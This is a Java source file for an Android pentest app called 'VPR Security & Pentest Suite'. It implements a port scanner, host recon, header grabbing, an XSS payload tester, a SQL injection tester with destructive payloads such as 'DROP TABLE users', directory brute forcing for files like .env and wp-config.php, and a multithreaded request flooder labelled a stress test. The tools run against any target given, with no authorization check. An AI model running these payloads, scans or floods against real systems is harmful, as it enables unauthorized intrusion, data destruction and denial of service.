package com.vpr.server;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class SecurityTools {

    public static final String BANNER =
        "\n" +
        "          000011111111111111111110\n" +
        "                                 011111111111\n" +
        "                                            1111111\n" +
        "                                                   111\n" +
        "                       011111111111111111111111111101\n" +
        "          011111100                                000\n" +
        "                                       0111111111111 1\n" +
        "                                 111110               11\n" +
        "                           01110                       1111111110\n" +
        "                       111                            111111111111111100\n" +
        "                   11                               1111             1111110\n" +
        "               11                                 1111                    11111\n" +
        "            1                                    111                          11111\n" +
        "                                                 110                           11111\n" +
        "                                                011                               111\n" +
        "                                                111                                  110\n" +
        "                                                 111\n" +
        "                                                 1111\n" +
        "                                                  1111\n" +
        "                                                    11111\n" +
        "                                                      1111111111111111111\n" +
        "                                                                    0111111111111\n" +
        "                                                                           0111  11110\n" +
        "                                                                               11     110\n" +
        "                                                                                 11      11\n" +
        "                                                                                   11      10\n" +
        "                                                                                     10     11\n" +
        "                                                                                      11      1\n" +
        "                                                                                       11      0\n" +
        "                                                                                        11\n" +
        "                                                                                         1\n" +
        "                                                                                          1\n" +
        "                                                                                          10\n" +
        "                                                                                           0\n" +
        "\n" +
        "  ╔═══════════════════════════════════════╗\n" +
        "  ║     VPR  —  Security & Pentest Suite  ║\n" +
        "  ║         The quieter you become,       ║\n" +
        "  ║       the more you are able to hear   ║\n" +
        "  ╚═══════════════════════════════════════╝\n" +
        "\n";

    // ─────────────────────────────────────────────
    // PORT SCANNER — Multi-thread
    // ─────────────────────────────────────────────
    public static String portScan(String host, int startPort, int endPort) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ PORT SCANNER ]\n");
        r.append("  Target : ").append(host).append("\n");
        r.append("  Range  : ").append(startPort).append(" - ").append(endPort).append("\n");
        r.append("  ─────────────────────────────────\n");

        List<Integer> openPorts = Collections.synchronizedList(new ArrayList<>());
        ExecutorService pool = Executors.newFixedThreadPool(200);
        List<Future<?>> futures = new ArrayList<>();

        for (int port = startPort; port <= endPort; port++) {
            final int p = port;
            futures.add(pool.submit(() -> {
                try (Socket s = new Socket()) {
                    s.connect(new InetSocketAddress(host, p), 300);
                    openPorts.add(p);
                } catch (Exception ignored) {}
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) {}
        }
        pool.shutdown();

        Collections.sort(openPorts);
        if (openPorts.isEmpty()) {
            r.append("  No open ports found.\n");
        } else {
            for (int p : openPorts) {
                r.append("  [OPEN]  ").append(p)
                 .append("/tcp  ").append(getServiceName(p)).append("\n");
            }
        }

        r.append("  ─────────────────────────────────\n");
        r.append("  Total open: ").append(openPorts.size()).append(" ports\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // HOST RECON — Info lengkap target
    // ─────────────────────────────────────────────
    public static String hostRecon(String host) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ HOST RECON ]\n");
        r.append("  Target : ").append(host).append("\n");
        r.append("  ─────────────────────────────────\n");

        try {
            InetAddress addr = InetAddress.getByName(host);
            r.append("  IP Address   : ").append(addr.getHostAddress()).append("\n");
            r.append("  Canonical    : ").append(addr.getCanonicalHostName()).append("\n");
            r.append("  Reachable    : ").append(addr.isReachable(3000) ? "YES" : "NO").append("\n");
            r.append("  Class        : ").append(addr instanceof Inet4Address ? "IPv4" : "IPv6").append("\n");
            r.append("  Loopback     : ").append(addr.isLoopbackAddress()).append("\n");
            r.append("  Multicast    : ").append(addr.isMulticastAddress()).append("\n");

            // All resolved IPs
            InetAddress[] all = InetAddress.getAllByName(host);
            r.append("  All IPs      :\n");
            for (InetAddress a : all) {
                r.append("    - ").append(a.getHostAddress()).append("\n");
            }

            // Whois-like via HTTP
            r.append("\n  [ Whois Info ]\n");
            try {
                URL url = new URL("http://ip-api.com/json/" + addr.getHostAddress());
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder json = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) json.append(line);
                br.close();
                String j = json.toString();
                r.append("  ").append(j.replace(",", "\n  ")
                    .replace("{", "").replace("}", "")
                    .replace("\"", "")).append("\n");
            } catch (Exception e) {
                r.append("  Whois: tidak tersedia\n");
            }

        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }

        r.append("  ─────────────────────────────────\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // HTTP HEADER GRAB + Teknologi detection
    // ─────────────────────────────────────────────
    public static String headerGrab(String targetUrl) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ HTTP HEADER GRAB ]\n");
        r.append("  Target : ").append(targetUrl).append("\n");
        r.append("  ─────────────────────────────────\n");

        try {
            URL url = new URL(targetUrl.startsWith("http") ? targetUrl : "http://" + targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("HEAD");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            conn.setInstanceFollowRedirects(true);
            conn.connect();

            r.append("  Status : ").append(conn.getResponseCode())
             .append(" ").append(conn.getResponseMessage()).append("\n\n");
            r.append("  [ Headers ]\n");

            for (Map.Entry<String, List<String>> h : conn.getHeaderFields().entrySet()) {
                if (h.getKey() != null) {
                    r.append("  ").append(h.getKey()).append(": ")
                     .append(String.join(", ", h.getValue())).append("\n");
                }
            }
            conn.disconnect();
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ─────────────────────────────────\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // CVE / VULNERABILITY CHECK
    // ─────────────────────────────────────────────
    public static String cveCheck(String targetUrl) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ CVE / VULNERABILITY SCANNER ]\n");
        r.append("  Target : ").append(targetUrl).append("\n");
        r.append("  ─────────────────────────────────\n");

        try {
            URL url = new URL(targetUrl.startsWith("http") ? targetUrl : "http://" + targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setInstanceFollowRedirects(true);
            conn.connect();

            Map<String, List<String>> headers = conn.getHeaderFields();
            int score = 0;

            // Security Headers check
            String[][] secChecks = {
                {"X-Frame-Options",            "Clickjacking protection"},
                {"X-XSS-Protection",           "XSS filter"},
                {"Content-Security-Policy",     "CSP injection protection"},
                {"Strict-Transport-Security",   "HSTS — force HTTPS"},
                {"X-Content-Type-Options",      "MIME sniffing protection"},
                {"Referrer-Policy",             "Referrer info leakage"},
                {"Permissions-Policy",          "Browser feature control"},
                {"Cross-Origin-Opener-Policy",  "Cross-origin isolation"},
                {"Cross-Origin-Resource-Policy","Cross-origin resource leak"}
            };

            r.append("  [ Security Header Audit ]\n");
            for (String[] check : secChecks) {
                boolean found = false;
                for (String k : headers.keySet()) {
                    if (k != null && k.equalsIgnoreCase(check[0])) { found = true; break; }
                }
                if (found) {
                    r.append("  [✓] ").append(check[0]).append("\n");
                    score += 10;
                } else {
                    r.append("  [✗] ").append(check[0])
                     .append(" — MISSING  ⚠ ").append(check[1]).append(" disabled\n");
                }
            }

            // Server banner
            r.append("\n  [ Server Fingerprint ]\n");
            for (String k : new String[]{"Server","X-Powered-By","X-AspNet-Version",
                                          "X-Generator","Via","X-Backend-Server"}) {
                List<String> v = null;
                for (Map.Entry<String, List<String>> e : headers.entrySet()) {
                    if (e.getKey() != null && e.getKey().equalsIgnoreCase(k)) {
                        v = e.getValue(); break;
                    }
                }
                if (v != null) {
                    r.append("  ⚠ ").append(k).append(": ").append(v).append("\n");
                    score -= 10;
                }
            }

            // Cookies check
            r.append("\n  [ Cookie Security ]\n");
            List<String> cookies = null;
            for (Map.Entry<String, List<String>> e : headers.entrySet()) {
                if (e.getKey() != null && e.getKey().equalsIgnoreCase("set-cookie")) {
                    cookies = e.getValue(); break;
                }
            }
            if (cookies != null) {
                for (String cookie : cookies) {
                    boolean secure   = cookie.contains("Secure");
                    boolean httpOnly = cookie.contains("HttpOnly");
                    boolean sameSite = cookie.toLowerCase().contains("samesite");
                    r.append("  Cookie: ").append(cookie.split(";")[0]).append("\n");
                    r.append("    Secure  : ").append(secure   ? "✓" : "✗ MISSING").append("\n");
                    r.append("    HttpOnly: ").append(httpOnly ? "✓" : "✗ MISSING").append("\n");
                    r.append("    SameSite: ").append(sameSite ? "✓" : "✗ MISSING").append("\n");
                }
            } else {
                r.append("  No cookies found\n");
            }

            // Security score
            r.append("\n  [ Security Score ]\n");
            r.append("  Score : ").append(Math.max(0, score)).append(" / 90\n");
            String rating = score >= 70 ? "GOOD" : score >= 40 ? "MEDIUM" : "VULNERABLE";
            r.append("  Rating: ").append(rating).append("\n");

            conn.disconnect();
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }

        r.append("  ─────────────────────────────────\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // XSS PAYLOAD TESTER
    // ─────────────────────────────────────────────
    public static String xssTest(String targetUrl) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ XSS PAYLOAD TESTER ]\n");
        r.append("  Target : ").append(targetUrl).append("\n");
        r.append("  ─────────────────────────────────\n");

        String[][] payloads = {
            {"<script>alert(1)</script>",                    "Basic Script"},
            {"'\"><img src=x onerror=alert(1)>",             "IMG onerror"},
            {"javascript:alert(document.cookie)",            "JS Protocol"},
            {"<svg onload=alert(1)>",                        "SVG onload"},
            {"\"><script>alert(document.domain)</script>",   "Domain leak"},
            {"<body onload=alert(1)>",                       "Body onload"},
            {"<iframe src=javascript:alert(1)>",             "Iframe JS"},
            {"'+alert(1)+'",                                 "String break"},
            {"<details open ontoggle=alert(1)>",             "Details toggle"},
            {"<input onfocus=alert(1) autofocus>",           "Input focus"}
        };

        int found = 0;
        for (String[] pl : payloads) {
            try {
                String encoded = URLEncoder.encode(pl[0], "UTF-8");
                String base = targetUrl.startsWith("http") ? targetUrl : "http://" + targetUrl;
                URL url = new URL(base + (base.contains("?") ? "&" : "?") + "q=" + encoded);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(4000);
                conn.setReadTimeout(4000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.connect();
                int code = conn.getResponseCode();

                // Baca response cek apakah payload di-reflect
                BufferedReader br = new BufferedReader(
                    new InputStreamReader(conn.getInputStream()));
                StringBuilder body = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) body.append(line);
                br.close();

                boolean reflected = body.toString().contains(pl[0].substring(0, 5));
                r.append("  [").append(code).append("] ")
                 .append(reflected ? "⚠ REFLECTED " : "  safe       ")
                 .append(pl[1]).append("\n");
                if (reflected) found++;
                conn.disconnect();
            } catch (Exception e) {
                r.append("  [ERR] ").append(pl[1]).append("\n");
            }
        }

        r.append("  ─────────────────────────────────\n");
        r.append("  Reflected XSS found: ").append(found).append(" / ")
         .append(payloads.length).append("\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // SQL INJECTION TESTER
    // ─────────────────────────────────────────────
    public static String sqlTest(String targetUrl) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ SQL INJECTION TESTER ]\n");
        r.append("  Target : ").append(targetUrl).append("\n");
        r.append("  ─────────────────────────────────\n");

        String[] payloads = {
            "'", "''", "`", "\"", "1' OR '1'='1",
            "1; DROP TABLE users--", "' OR 1=1--",
            "admin'--", "1' AND 1=2 UNION SELECT 1,2,3--",
            "' UNION SELECT null,null,null--"
        };

        String[] errorSigns = {
            "sql", "mysql", "syntax", "error", "warning",
            "ORA-", "pg_", "sqlite", "JDBC", "unclosed"
        };

        int vulnCount = 0;
        for (String pl : payloads) {
            try {
                String encoded = URLEncoder.encode(pl, "UTF-8");
                String base = targetUrl.startsWith("http") ? targetUrl : "http://" + targetUrl;
                URL url = new URL(base + (base.contains("?") ? "&" : "?") + "id=" + encoded);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(4000);
                conn.setReadTimeout(4000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");

                int code = conn.getResponseCode();
                BufferedReader br = new BufferedReader(
                    new InputStreamReader(
                        code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                StringBuilder body = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) body.append(line.toLowerCase());
                br.close();

                boolean vuln = false;
                String trigger = "";
                for (String sign : errorSigns) {
                    if (body.toString().contains(sign)) {
                        vuln = true; trigger = sign; break;
                    }
                }

                r.append("  [").append(code).append("] ")
                 .append(vuln ? "⚠ VULN  [" + trigger + "] " : "  safe          ")
                 .append(pl.length() > 20 ? pl.substring(0, 20) + "..." : pl).append("\n");
                if (vuln) vulnCount++;
                conn.disconnect();
            } catch (Exception e) {
                r.append("  [ERR] ").append(pl).append("\n");
            }
        }

        r.append("  ─────────────────────────────────\n");
        r.append("  SQLi vulnerable: ").append(vulnCount).append(" / ").append(payloads.length).append("\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // DIRECTORY BRUTE FORCE
    // ─────────────────────────────────────────────
    public static String dirBrute(String targetUrl, SessionView sv,
                                   android.os.Handler handler) {
        handler.post(() -> {
            sv.print(BANNER);
            sv.print("[ DIRECTORY BRUTE FORCE ]\n");
            sv.print("  Target : " + targetUrl + "\n");
            sv.print("  ─────────────────────────────────\n");
        });

        String[] paths = {
            "admin", "login", "dashboard", "wp-admin", "phpmyadmin",
            "cpanel", "administrator", "api", "api/v1", "api/v2",
            "backup", "config", "db", "database", "uploads", "files",
            "images", "static", "assets", "js", "css", "includes",
            ".env", ".git", "robots.txt", "sitemap.xml", "readme.txt",
            "config.php", "wp-config.php", "index.php", "info.php",
            "test", "dev", "staging", "old", "temp", "tmp",
            "user", "users", "account", "accounts", "register",
            "panel", "manage", "management", "control", "secure"
        };

        String base = targetUrl.startsWith("http") ? targetUrl : "http://" + targetUrl;
        int found = 0;

        for (String path : paths) {
            try {
                URL url = new URL(base.replaceAll("/$", "") + "/" + path);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.setInstanceFollowRedirects(false);
                conn.connect();
                int code = conn.getResponseCode();
                conn.disconnect();

                if (code == 200 || code == 301 || code == 302 || code == 403) {
                    final int c = code;
                    final String p = path;
                    final boolean isFound = (code != 404);
                    if (isFound) {
                        found++;
                        handler.post(() -> sv.print(
                            "  [" + c + "] /" + p +
                            (c == 403 ? " ⚠ Forbidden (exists)" :
                             c == 200 ? " ✓ FOUND" : " → Redirect") + "\n"
                        ));
                    }
                }
            } catch (Exception ignored) {}
        }

        final int total = found;
        handler.post(() -> {
            sv.print("  ─────────────────────────────────\n");
            sv.print("  Found: " + total + " paths\n");
        });
        return "";
    }

    // ─────────────────────────────────────────────
    // STRESS TEST / LOAD TEST
    // ─────────────────────────────────────────────
    public static void stressTest(String targetUrl, int threads, int requests,
                                   SessionView sv, android.os.Handler handler) {
        handler.post(() -> {
            sv.print(BANNER);
            sv.print("[ STRESS TEST / LOAD TEST ]\n");
            sv.print("  Target   : " + targetUrl + "\n");
            sv.print("  Threads  : " + threads + "\n");
            sv.print("  Requests : " + requests + "\n");
            sv.print("  ─────────────────────────────────\n");
        });

        final int[] success = {0};
        final int[] failed  = {0};
        final long start = System.currentTimeMillis();

        ExecutorService pool = Executors.newFixedThreadPool(threads);
        List<Future<?>> futures = new ArrayList<>();

        for (int i = 0; i < requests; i++) {
            futures.add(pool.submit(() -> {
                try {
                    URL url = new URL(targetUrl.startsWith("http") ?
                        targetUrl : "http://" + targetUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(3000);
                    conn.setReadTimeout(3000);
                    conn.setRequestProperty("User-Agent",
                        "Mozilla/5.0 VPR-StressTest/" + System.nanoTime());
                    conn.connect();
                    conn.getResponseCode();
                    conn.disconnect();
                    synchronized (success) { success[0]++; }
                } catch (Exception e) {
                    synchronized (failed) { failed[0]++; }
                }
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) {}
        }
        pool.shutdown();

        long elapsed = System.currentTimeMillis() - start;
        long rps = requests * 1000L / Math.max(elapsed, 1);

        handler.post(() -> {
            sv.print("  Success  : " + success[0] + "\n");
            sv.print("  Failed   : " + failed[0] + "\n");
            sv.print("  Duration : " + elapsed + "ms\n");
            sv.print("  RPS      : " + rps + " req/s\n");
            sv.print("  ─────────────────────────────────\n");
        });
    }

    // ─────────────────────────────────────────────
    // DNS LOOKUP
    // ─────────────────────────────────────────────
    public static String dnsLookup(String host) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ DNS LOOKUP ]\n");
        r.append("  Host : ").append(host).append("\n");
        r.append("  ─────────────────────────────────\n");
        try {
            InetAddress[] addrs = InetAddress.getAllByName(host);
            for (InetAddress a : addrs) {
                r.append("  ").append(a instanceof Inet4Address ? "A    " : "AAAA ")
                 .append(a.getHostAddress()).append("\n");
            }
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ─────────────────────────────────\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // PING
    // ─────────────────────────────────────────────
    public static String ping(String host) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ PING ]\n");
        r.append("  Target : ").append(host).append("\n");
        r.append("  ─────────────────────────────────\n");
        int replied = 0;
        long totalMs = 0;
        try {
            InetAddress addr = InetAddress.getByName(host);
            for (int i = 1; i <= 4; i++) {
                long t = System.currentTimeMillis();
                boolean reach = addr.isReachable(2000);
                long ms = System.currentTimeMillis() - t;
                if (reach) { replied++; totalMs += ms; }
                r.append("  [").append(i).append("] ")
                 .append(reach ? "Reply from " + addr.getHostAddress() +
                     " time=" + ms + "ms" : "Request timeout").append("\n");
            }
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ─────────────────────────────────\n");
        r.append("  Sent: 4 | Received: ").append(replied)
         .append(" | Lost: ").append(4 - replied).append("\n");
        if (replied > 0)
            r.append("  Avg RTT: ").append(totalMs / replied).append("ms\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // BANNER GRAB — Ambil banner service
    // ─────────────────────────────────────────────
    public static String bannerGrab(String host, int port) {
        StringBuilder r = new StringBuilder();
        r.append(BANNER);
        r.append("[ BANNER GRAB ]\n");
        r.append("  Target : ").append(host).append(":").append(port).append("\n");
        r.append("  ─────────────────────────────────\n");
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress(host, port), 3000);
            s.setSoTimeout(3000);
            BufferedReader br = new BufferedReader(
                new InputStreamReader(s.getInputStream()));
            String banner = br.readLine();
            s.close();
            r.append("  Banner : ").append(banner).append("\n");
        } catch (Exception e) {
            r.append("  No banner / closed: ").append(e.getMessage()).append("\n");
        }
        r.append("  ─────────────────────────────────\n");
        return r.toString();
    }

    // ─────────────────────────────────────────────
    // SERVICE NAME
    // ─────────────────────────────────────────────
    private static String getServiceName(int port) {
        Map<Integer, String> s = new HashMap<>();
        s.put(21,"FTP"); s.put(22,"SSH"); s.put(23,"Telnet");
        s.put(25,"SMTP"); s.put(53,"DNS"); s.put(80,"HTTP");
        s.put(110,"POP3"); s.put(143,"IMAP"); s.put(443,"HTTPS");
        s.put(445,"SMB"); s.put(3306,"MySQL"); s.put(5432,"PostgreSQL");
        s.put(6379,"Redis"); s.put(8080,"HTTP-Alt"); s.put(8443,"HTTPS-Alt");
        s.put(27017,"MongoDB"); s.put(3389,"RDP"); s.put(5900,"VNC");
        s.put(1433,"MSSQL"); s.put(1521,"Oracle"); s.put(2181,"Zookeeper");
        s.put(9200,"Elasticsearch"); s.put(11211,"Memcached");
        return s.getOrDefault(port, "unknown");
    }
}
